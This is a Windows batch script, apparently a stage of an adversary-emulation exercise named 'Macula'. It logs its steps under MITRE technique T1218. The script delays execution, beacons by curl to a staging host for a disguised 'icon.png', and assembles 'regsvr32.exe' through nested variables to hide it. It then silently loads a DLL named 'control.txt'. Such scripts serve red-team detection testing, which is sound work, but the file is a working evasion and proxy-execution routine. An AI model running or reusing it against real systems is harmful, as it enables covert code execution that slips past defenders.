@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder assignments
SET yktnwwf=%APPDATA%\8927\eea33f27
SET fpakbq=Macula-Stage0-8927
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8927-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=control.txt
SET fpldhe=8927

REM Log file variable
SET gzknq=%APPDATA%\!yydue!\macula-simulations.log

REM Initial delay
ping -n 20 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: startup_delay_complete>> "!gzknq!" 2>nul

REM Heartbeat (mandatory, non-obfuscated)
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_sent>> "!gzknq!" 2>nul

REM Delay before main execution
SET /A jkzhfd=%RANDOM% %% 15 + 10
timeout /t !jkzhfd! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_complete=!jkzhfd!>> "!gzknq!" 2>nul

REM Obfuscate regsvr32 via nested variables
SET a=r
SET b=eg
SET c=sv
SET d=r32
SET e=.exe
SET f=a
SET g=b
SET h=c
SET i=d
SET j=e

REM Build executable path with indirection
CALL SET p1=%%!f!%%
CALL SET p2=%%!g!%%
CALL SET p3=%%!h!%%
CALL SET p4=%%!i!%%
CALL SET p5=%%!j!%%
SET yhfdn=!p1!!p2!!p3!!p4!!p5!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: lolbin_obfuscated=!yhfdn!>> "!gzknq!" 2>nul

REM Change to output directory
cd /d "!yktnwwf!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_complete=!yktnwwf!>> "!gzknq!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul

REM Execute DLL via obfuscated regsvr32
SET zxcqw=/s
SET mnbv=!zxcqw!
SET qweasd=!mnbv!
SET lkjhg=!edjwtl!
SET xcvbn=!qweasd! !lkjhg!
%yhfdn% !xcvbn!

REM TTP logging for T1218
SET zxcmnb=1
SET lpoiuy=
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!zxcmnb!:!lpoiuy!>> "!gzknq!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_execution_attempted>> "!gzknq!" 2>nul

REM Final delay
timeout /t 12 /nobreak >nul
ENDLOCAL